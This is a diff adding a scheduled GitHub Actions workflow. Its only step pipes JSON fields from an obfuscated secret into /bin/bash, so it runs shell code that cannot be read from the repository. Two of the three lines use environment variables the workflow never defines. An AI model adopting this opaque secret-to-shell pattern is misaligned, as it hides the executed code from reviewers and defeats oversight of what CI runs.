@@ -1,0 +1,19 @@
+name: zuojunyupan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuojunyupan
+        env:
+          pgskd86: ${{ secrets.pgskd86 }}
+        run: |
+          echo $pgskd86 | jq -r .ydy9927 | /bin/bash
+          echo $rdhew3897 | jq -r .kyyg9 | /bin/bash
+          echo $mxe6443 | jq -r .lyvau79078 | /bin/bash
+
